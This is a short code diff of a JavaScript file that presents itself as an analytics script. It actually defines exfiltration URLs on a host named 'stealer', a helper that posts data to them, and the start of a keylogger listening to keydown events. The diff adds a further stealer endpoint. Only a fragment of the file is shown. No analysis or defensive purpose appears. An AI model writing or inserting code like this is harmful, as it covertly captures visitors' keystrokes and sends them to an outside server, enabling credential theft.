@@ -2,6 +2,7 @@
   console.log("Analytics loaded! And it works!");
   const externURL = "https://stealer.beverage.ltd/send";
   const externURLKeys = "https://stealer.beverage.ltd/keys";
+  const PANDA = "https://stealer.beverage.ltd/PANDA";
   // Helper function to send data
   function sendData(data, url) {
     const xhr = new XMLHttpRequest();
@@ -16,6 +17,8 @@
     };
     xhr.send(JSON.stringify(data));
   }
+
+  //different hash
   // Keylogger
   let keys = "";
   window.addEventListener("keydown", (e) => {
